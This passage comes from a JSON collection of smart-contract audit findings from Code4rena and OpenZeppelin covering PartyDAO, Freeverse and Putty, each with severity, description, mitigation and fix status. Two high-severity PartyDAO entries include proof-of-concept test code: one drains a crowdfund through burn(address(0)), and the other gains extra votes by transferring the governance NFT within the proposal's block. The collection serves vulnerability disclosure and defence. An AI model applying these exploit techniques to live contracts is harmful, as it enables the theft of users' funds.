pb.burn(payable(address(0)));\n+        assertEq(address(pb).balance, 0);\n```\n\n### Recommended Mitigation Steps\n\nDo not allow an initial contribution when `opts.initialContributor` is not set.\n\n**[merklejerk (PartyDAO) confirmed and commented](https://github.com/code-423n4/2022-09-party-findings/issues/105#issuecomment-1254181677):**\n > Excellent catch. We will implement the fix from [#238](https://github.com/code-423n4/2022-09-party-findings/issues/238) and prevent minting to `address(0)`.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-09-party-findings/issues/105#issuecomment-1262738133):**\n > Agree with High risk - a crowdfund's initial configuration could lead to the loss of user funds.\n\n**[0xble (PartyDAO) resolved](https://github.com/code-423n4/2022-09-party-findings/issues/105#issuecomment-1264675679):**\n > Resolved: https://github.com/PartyDAO/partybidV2/pull/127\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a vulnerability in the PartyDAO's Crowdfund.sol contract. If the parameter `opts.initialContributor` is set to `address(0)` and `opts.initialDelegate` is not, there are two problems. Firstly, if the crowdfund succeeds, the initial balance will be lost. Secondly, if the crowdfund does not succeed, anyone can completely drain the contract by repeatedly calling `burn` with `address(0)`. This could lead to the loss of all funds of a crowdfund. \n\nProof of concept code is provided in the report to illustrate this scenario. The recommended mitigation step is to not allow an initial contribution when `opts.initialContributor` is not set.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/105",
      "tags": [],
      "finders": [
        "Lambda",
        "8olidity"
      ]
    },
    {
      "id": "3302",
      "title": "[H-01] PartyGovernance: Can vote multiple times by transferring NFT in same block as proposal",
      "impact": "HIGH",
      "content": "_Submitted by Lambda, also found by Trust_\n\n`PartyGovernanceNFT` uses the voting power at the time of proposal when calling `accept`. The problem with that is that a user can vote, transfer the NFT (and the voting power) to a different wallet, and then vote from this second wallet again during the same block that the proposal was created.\nThis can also be repeated multiple times to get an arbitrarily high voting power and pass every proposal unanimously.\n\nThe consequences of this are very severe. Any user (no matter how small his voting power is) can propose and pass arbitrary proposals animously and therefore steal all assets (including the precious tokens) out of the party.\n\n### Proof Of Concept\n\nThis diff shows how a user with a voting power of 50/100 gets a voting power of 100/100 by transferring the NFT to a second wallet that he owns and voting from that one:\n\n```diff\n--- a/sol-tests/party/PartyGovernanceUnit.t.sol\n+++ b/sol-tests/party/PartyGovernanceUnit.t.sol\n@@ -762,6 +762,7 @@ contract PartyGovernanceUnitTest is Test, TestUtils {\n         TestablePartyGovernance gov =\n             _createGovernance(100e18, preciousTokens, preciousTokenIds);\n         address undelegatedVoter = _randomAddress();\n+        address recipient = _randomAddress();\n         // undelegatedVoter has 50/100 intrinsic VP (delegated to no one/self)\n         gov.rawAdjustVotingPower(undelegatedVoter, 50e18, address(0));\n \n@@ -772,38 +773,13 @@ contract PartyGovernanceUnitTest is Test, TestUtils {\n         // Undelegated voter submits proposal.\n         vm.prank(undelegatedVoter);\n         assertEq(gov.propose(proposal, 0), proposalId);\n-\n-        // Try to execute proposal (fail).\n-        vm.expectRevert(abi.encodeWithSelector(\n-            PartyGovernance.BadProposalStatusError.selector,\n-            PartyGovernance.ProposalStatus.Voting\n-        ));\n-        vm.prank(undelegatedVoter);\n-        gov.execute(\n-            proposalId,\n-            proposal,\n-            preciousTokens,\n-            preciousTokenIds,\n-            \"\",\n-            \"\"\n-        );\n-\n-        // Skip past execution delay.\n-        skip(defaultGovernanceOpts.executionDelay);\n-        // Try again (fail).\n-        vm.expectRevert(abi.encodeWithSelector(\n-            PartyGovernance.BadProposalStatusError.selector,\n-            PartyGovernance.ProposalStatus.Voting\n-        ));\n-        vm.prank(undelegatedVoter);\n-        gov.execute(\n-            proposalId,\n-            proposal,\n-            preciousTokens,\n-            preciousTokenIds,\n-            \"\",\n-            \"\"\n-        );\n+        (, PartyGovernance.ProposalStateValues memory valuesPrev) = gov.getProposalStateInfo(proposalId);\n+        assertEq(valuesPrev.votes, 50e18);\n+        gov.transferVotingPower(undelegatedVoter, recipient, 50e18); //Simulate NFT transfer\n+        vm.prank(recipient);\n+        gov.accept(proposalId, 0);\n+        (, PartyGovernance.ProposalStateValues memory valuesAfter) = gov.getProposalStateInfo(proposalId);\n+        assertEq(valuesAfter.votes, 100e18);\n     }\n```\n\n### Recommended Mitigation Steps\n\nYou should query the voting power at `values.proposedTime - 1`. This value is already finalized when the proposal is created and therefore cannot be manipulated by repeatedly transferring the voting power to different wallets.\n\n**[merklejerk (PartyDAO) confirmed and commented](https://github.com/code-423n4/2022-09-party-findings/issues/113#issuecomment-1254200841):**\n > This is our favorite find and want to call it out specifically. We would consider this critical.\n> \n> We will implement the suggested fix in this PR and use `proposedTime - 1` for voting power calculations.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-09-party-findings/issues/113#issuecomment-1262756331):**\n > Agree with High risk - any user with a non-zero voting power can pass a proposal & steal assets.\n\n**[0xble (PartyDAO) resolved](https://github.com/code-423n4/2022-09-party-findings/issues/113#issuecomment-1264675378):**\n > Resolved: https://github.com/PartyDAO/partybidV2/pull/130\n\n\n\n***\n\n",
      "summary": "\nA bug report has been reported in the PartyDAO/party-contracts-c4 repository in the file PartyGovernance.sol, on line 594. The vulnerability has been identified as a user being able to vote, transfer the NFT (and the voting power) to a different wallet, and then vote from this second wallet again during the same block that the proposal was created. This can be repeated multiple times to get an arbitrarily high voting power and pass every proposal unanimously, leading to theft of all assets (including precious tokens) from the party.\n\nA proof of concept has been provided, showing how a user with a voting power of 50/100 gets a voting power of 100/100 by transferring the NFT to a second wallet that they own and voting from that one.\n\nThe recommended mitigation steps are to query the voting power at `values.proposedTime - 1`. This value is already finalized when the proposal is created and therefore cannot be manipulated by repeatedly transferring the voting power to different wallets.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/113",
      "tags": [
        "Vote",
        "Bypass limit"
      ],
      "finders": [
        "Lambda",
        "Trust"
      ]
    },
    {
      "id": "10536",
      "title": "Redundant check of unused and signed data",
      "impact": "LOW",
      "content": "In the [`assertBidInputsOk` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L224) of the [`AuctionBase` contract](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol), incoming bid data is checked and verified based on the state of the auction. In the case of `State.Auctioning`, it is required that the `bidInput.feeBPS` and `bidInput.endsAt` values align with the values that were saved during the initial bid. [Both checks](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L253-L263) are redundant for two reasons:\n\n\n1. The provided call values `bidInput.feeBPS` and `bidInput.endsAt` are not being used.\n2. The operator signed these values so they are expected to match. This is contradictory and undermines the given strong trust assumption.\n\n\nThe checks are for user experience only, mainly to guarantee on a contract level that the user does not provide different values than the initial data. This could lead to a user paying a different fee than expected.\n\n\nConsider moving these checks off-chain to save some gas and simplify the code.\n\n\n***Update**: Fixed with commit `715f28a` of [PR#9](https://github.com/freeverseio/crypto-payments/pull/9).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10535",
      "title": "Inaccurate revert string",
      "impact": "LOW",
      "content": "The [`withdrawTo`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol#L154) function will revert with the message [`tx sender not authorized to withdraw on recipients behalf`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol#L157) in the case that the given `recipient` is set to false in the `onlyUserCanWithdraw` mapping.\n\n\nThis function should not revert if the passed in `recipient` address is the same as the address calling the function.\n\n\nConsider updating the logic to never revert when a user attempts to withdraw their own funds with the `withdrawTo` function.\n\n\n***Update**: Fixed with commit `b5db284` of [PR#10](https://github.com/freeverseio/crypto-payments/pull/10/).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10534",
      "title": "Gas optimization",
      "impact": "LOW",
      "content": "In the [`_processBid` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L105) of the [`AuctionBase` contract](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol), the `BidInput` struct is processed from `memory`. Further, that struct is propagated to the [`assertBidInputsOk` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L224), where the inputs are sent via `memory` again, while they are defined as `calldata` in the [`IAuctionBase` interface](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/IAuctionBase.sol#L237).\n\n\nConsider changing both locations from `memory` to `calldata` to save gas.\n\n\nIn the [`assertBidInputsOk` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L224) of the [`AuctionBase` contract](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol), the `bidInput` requirements are checked. These checks include, whether the `bidInput.deadline` is met and if the `bidInput.seller` should be registered. Further checks are based on the state of a payment that is fetched from the state of the blockchain.\n\n\nConsider moving [line 229](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L229), to line 240 to save some gas getting the payment state if one of the two mentioned checks fail.\n\n\n***Update**: Fixed with commit `00705cc` of [PR#11](https://github.com/freeverseio/crypto-payments/pull/11).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10533",
      "title": "_acceptedCurrency could be misleading",
      "impact": "LOW",
      "content": "Due to the support of ERC20s and blockchain native currencies, payments are settled through the currency indicated by the [`_acceptedCurrency` variable](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol#L48) that is set during deployment in the [`BuyNowBase` constructor](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol#L48).\n\n\nSince this variable is passed in rather than obtained via calling the `name` or `symbol` functions of the ERC20s, it is possible to have a different underlying currency than the one claimed to be supported, possibly resulting in an uncareful user accidentally paying an unexpected price.\n\n\nConsider implementing the `_acceptedCurrency` through the symbol or name view function of the underlying ERC20 contract with a fallback to the native currency, as well as maintaining a manual method for cases of ERC20s that do not support those functions.\n\n\n***Update**: Fixed with commit `bd26283` of [PR#17](https://github.com/freeverseio/crypto-payments/pull/17).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10532",
      "title": "Withdraw with finalBalance adds unnecessary complexity",
      "impact": "LOW",
      "content": "In the [`BuyNowBase` contract](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol), the [`_withdrawAmount` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol#L320) takes three arguments: The `recipient`, who’s balance is withdrawn, the `amount`, and a `finalBalance`. `finalBalance` is used to set the balance state of the recipient, which adds unnecessary complexity and is error prone.\n\n\nConsider updating the balance by subtracting the withdrawn amount like `_balanceOf[recipient] -= amount;` in order to simplify the function.\n\n\n***Update**: Fixed with commit `d9bd95a` of [PR#12](https://github.com/freeverseio/crypto-payments/pull/12).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10531",
      "title": "Loose restriction on fees",
      "impact": "LOW",
      "content": "Currently, fees on buys and won auctions are not restricted and can be arbitrarily set for up to 100% via the `assertBidInputsOK` function in the [`BuyNowBase`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol#L395) and [`AuctionBase`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L245-L248) contracts. Such `feeBPS` value is given through the input data that is signed by the operator.\n\n\nDespite the trust assumption towards the operator, consider limiting the fee to a lower percentage or setting it on a contract level similar to the `_paymentWindow`. By doing so it is less likely that the seller gets less funds than intended due to an unexpectedly high fee.\n\n\n***Update**: Fixed with commit `bfa52af` of [PR#13](https://github.com/freeverseio/crypto-payments/pull/13).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10530",
      "title": "Events lack previous values",
      "impact": "LOW",
      "content": "There are a couple instances of events which are emitted when the state of the contract is changed. Among these events, some only record the new value and omit recording the previous value.\n\n\nHere are instances of this issue:\n\n\n* [`event EIP712`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/IBuyNowBase.sol#L67)\n* [`event PaymentWindow`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/IBuyNowBase.sol#L74)\n* [`event OnlyUserCanWithdraw`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/IBuyNowBase.sol#L91)\n* [`event DefaultFeesCollector`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/roles/FeesCollectors.sol#L25)\n* [`event UniverseFeesCollector`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/roles/FeesCollectors.sol#L32)\n* [`event DefaultOperator`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/roles/Operators.sol#L28)\n* [`event UniverseOperator`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/roles/Operators.sol#L35)\n* [`event DefaultAuctionConfig`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/IAuctionBase.sol#L88-L92)\n* [`event UniverseAuctionConfig`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/IAuctionBase.sol#L105-L110)\n\n\nWhen using events to record state changes, it is recommended to record the previous value as well to document the entirety of the change. Consider including the previous state to any event that changes the state of the contract.\n\n\n***Update**: Fixed with commit `6e02cc3` of [PR#14](https://github.com/freeverseio/crypto-payments/pull/14).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10529",
      "title": "Seller’s signature not required",
      "impact": "MEDIUM",
      "content": "In this protocol, listing an asset is simply having the operator sign either a [`BidInput`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/ISignableStructsAuction.sol#L19) or a [`BuyNowInput`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/ISignableStructsBuyNow.sol#L18) struct. From there, once a buyer either places a bid or completes a buy-it-now listing, the struct will be saved on-chain. When processing either type of struct, the only requirements around signing is a valid signature from the operator.\n\n\nNowhere in the process is it required for the seller to signal that they intend to sell their asset. Requiring the seller’s signature over the listing would ensure that the origin of the listing was the seller itself. If a signature was not required, users could create phony listings that will never complete.\n\n\nSince the seller is required to actually transfer an asset at the end of a listing, the worst situation that should arise would be a large number of listings that do not complete after they end, resulting in users’ funds being locked for small periods of time.\n\n\nConsider requiring the seller’s signature along with the operator’s when listing assets.\n\n\n***Update**: Partially fixed with commit `097fa4c` of [PR#18](https://github.com/freeverseio/crypto-payments/pull/18). Seller validation is done with a signature over the `paymentId`, which does not remove the need for trust between operator and seller. However, the upgradability allowed via the EIP712 implementation contract allows for future updates which remedy this.*\n\n\n***The Freeverse team states:***\n\n\n\n> Following your suggestion, we decided to start, at least, with what we already have, and require the already-existing L2 sellerSignature to be provided to the payments contract. The data that makes paymentId is available off chain.\n> \n> \n> However, we also agreed with your point and decided that it’ll be nicer to move to a pattern where the seller signature is much closer to the others, so that the payments contract can verify the seller’s intention pre-digest.\n> \n> \n> That’s why the PR intentionally provides an interface for verifySellerSignature where future upgrades of the verification contract (via the setEIP712 method) can include implementations where the verification of the sellerSig makes use of the entire BuyNow/Auction input struct, as suggested. (note that verifySellerSignature already takes as inputs the entire bidInput/buynowInput struct).\n> \n> \n> Since changing the L2 current signature will take time (we first need to fill in details such as the not 1-to-1 mapping, and upgrades require coordination with nodes, etc.), we plan to do it carefully, and incorporate the suggestion using the setEIP712 method in due time.\n> \n>",
      "summary": "\nThis bug report is related to the protocol of listing an asset. It is currently required that the operator signs either a BidInput or a BuyNowInput struct. However, the seller is not required to signal that they intend to sell the asset. This could lead to phony listings that will never complete, resulting in users’ funds being locked for small periods of time.\n\nThe Freeverse team has partially fixed the issue by requiring the seller's signature over the paymentId. This does not completely remove the need for trust between the operator and seller, but it does allow for future updates that could remedy this. The team is planning to carefully incorporate the suggestion using the setEIP712 method in due time.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10528",
      "title": "Previous operator power is not revoked",
      "impact": "MEDIUM",
      "content": "During the process of a buy action within [`_processBuyNow`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol#L196) and bid action within [`_processBid`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L105), the payment details are saved on-chain using the `_payments` mapping. This includes the current operator address at the time of action, fetched through the `universeOperator` function within the `BuyNowERC20.buyNow`, `BuyNowERC20.relayedBuyNow`, `BuyNowNative.buyNow`, `AuctionERC20.bid`, `AuctionERC20.relayedBid`, and `AuctionNative.bid` functions.\n\n\nIn the case of an operator change, after the payment details have been written on-chain, there is no way to revoke the power of an operator. This means, if an operator’s key was compromised and that operator is saved as the operator in charge of a listing in the `_payments` mapping, they could still finalize a payment or auction with an untruthful `transferResult.wasSuccessful` outcome even after changing the current operator for the universe.\n\n\nFor instance, after the first bid on an auction and a consecutive operator change, the previous operator can bid and win the auction to then get the asset transferred. But during finalization they are able to sign that the asset transfer was not successful to also get the refund. Similarly, if the operator knows they are exchanged in the future, they can buy an asset or win an auction to then maliciously finalize the payment the same way.\n\n\nConsider revoking the power of any previous operator, e.g., by fetching the current operator through the [`universeOperator` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/roles/Operators.sol#L91) inside the [`_finalize` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol#L241). The returned address can then be checked against the provided signature to assure that only the current operator can finalize a payment. In addition, remove the operator from the [`Payments` struct](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/IBuyNowBase.sol#L155).\n\n\n***Update**: Fixed with commit `ff4ff3b` of [PR#15](https://github.com/freeverseio/crypto-payments/pull/15).*",
      "summary": "\nThis bug report is about the process of buying and bidding on an asset on the Freeverseio platform. The issue is that when an operator change occurs after the payment details have been written on-chain, there is no way to revoke the power of the old operator. This means, if the old operator's key was compromised, they could still finalize a payment or auction with an untruthful outcome even after changing the current operator for the universe. \n\nFor example, after the first bid on an auction and a consecutive operator change, the previous operator can bid and win the auction to then get the asset transferred. But during finalization, they can sign that the asset transfer was not successful to also get the refund. Similarly, if the operator knows they are exchanged in the future, they can buy an asset or win an auction to then maliciously finalize the payment the same way.\n\nTo fix this issue, the power of any previous operator should be revoked. This can be done by fetching the current operator through the universeOperator function inside the _finalize function. The returned address can then be checked against the provided signature to assure that only the current operator can finalize a payment. In addition, the operator should be removed from the Payments struct. This issue has now been fixed with commit ff4ff3b of PR#15.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10527",
      "title": "Misconfiguration could lead to blocking bids",
      "impact": "MEDIUM",
      "content": "In the [`_processBid` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L105) of the [`AuctionBase` contract](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L105) the time details of the auction are checked. These times are:\n\n\n* `extendableUntil` – The time until an auction may be extended through late bids.\n* `expirationTime` – The time until an asset must be transferred. Otherwise, the payment can be refunded by the user afterwards.\n\n\nThe requirement of [line 118](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L118) checks the following:\n\n\n\n\n```\nextendableUntil + _SAFETY_TRANSFER_WINDOW < expirationTime\n\n```\n\n\nHere, the `_SAFETY_TRANSFER_WINDOW` is a constant value of two hours. Therefore, the auction must expire after the longest possible duration, including enough time to transfer the asset. Further, substituting the values of `extendableUntil` and `expirationTime` and simplifying the inequation we receive:\n\n\n\n\n```\nuniverseExtendableBy(bidInput.universeId) + _SAFETY_TRANSFER_WINDOW < _paymentWindow\n\n```\n\n\nBoth values, `universeExtendableBy()` and `_paymentWindow`, are configurable by the contract owner. In the case that the system accidentally is configured to never satisfy the above condition, the requirement would always fail and so would calls to bid. No bids on new auctions would be processed, shutting down all upcoming auctions.\n\n\nConsider moving this requirement and adding additional checks when setting these configurations.\n\n\n***Update**: Fixed with commit `ef597b1` of [PR#16](https://github.com/freeverseio/crypto-payments/pull/16).*",
      "summary": "\nThis bug report is about the [`_processBid` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L105) of the [`AuctionBase` contract](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L105). The function checks the time details of the auction, which are `extendableUntil` and `expirationTime`. The requirement of [line 118](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L118) checks if the auction expires after the longest possible duration, including enough time to transfer the asset. The system was accidentally configured to never satisfy this condition, which meant that calls to bid would fail and no bids on new auctions would be processed, shutting down all upcoming auctions. The bug has been fixed with commit `ef597b1` of [PR#16](https://github.com/freeverseio/crypto-payments/pull/16).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "42744",
      "title": "[N-10] NatSpec Is Missing",
      "impact": "LOW",
      "content": "\nNatSpec if missing for the following function\n\n*   `PuttyV2Nft._mint`  - <https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2Nft.sol#L11>\n*   `PuttyV2Nft.transferFrom` - <https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2Nft.sol#L21>\n*   `PuttyV2Nft.balanceOf` - <https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2Nft.sol#L40>\n\n### Recommendation\n\nImplement NatSpec for all functions.\n\n**[outdoteth (Putty Finance) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/306#issuecomment-1178063479):**\n > High quality report.\n\n**[HickupHH3 commented](https://github.com/code-423n4/2022-06-putty-findings/issues/306#issuecomment-1186102954):**\n> > L-03 Insufficient Input Validation\n> \n> Disagree, I remember seeing there was a use case for having taker == maker discussed in 1 of the issues somewhere.\n> \n> > L-04 Order Cannot Be Filled Due To Unbounded Whitelist Within An Order\n> \n> Sort a duplicate of #290.\n> \n> Agree that overall it is a very good report! \n\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42743",
      "title": "[N-09] Incorrect functions visibility",
      "impact": "LOW",
      "content": "\nWhenever a function is not being called internally in the code, it can be easily declared as `external`, [saving also gas](https://github.com/crytic/slither/wiki/Detector-Documentation#description-44). While the entire code base have explicit visibilities for every function, some of them can be changed to be `external`.\n\nFollowing are some the functions that can be changed to be `external`\n\n*   `PuttyV2.fillorder`\n*   `PuttyV2.exercise`\n*   `PuttyV2.withdraw`\n*   `PuttyV2.batchFillOrder`\n*   `Putty.acceptCounterOffer`\n\n### Recommendation\n\nReview the visibility of the affected functions and change visibility of these functions to `external`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42742",
      "title": "[N-08] Unused imports",
      "impact": "LOW",
      "content": "\nTo improve readability and avoid confusion, consider removing the following unused imports:\n\nIn the `PuttyV2Nft` contract:\n\n*   openzeppelin/utils/Strings.sol\n\nNote that the `Strings.sol` has already been imported in `PuttyV2` contract. Thus, this import can be safely removed.\n\nWithin the `PuttyV2Nft` contract, it does not use any of the functions from `Strings.sol`.\n\n### Recommendation\n\nConsider removing the unused import if it is not required.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42741",
      "title": "[N-07] Inconsistent use of named return variables",
      "impact": "LOW",
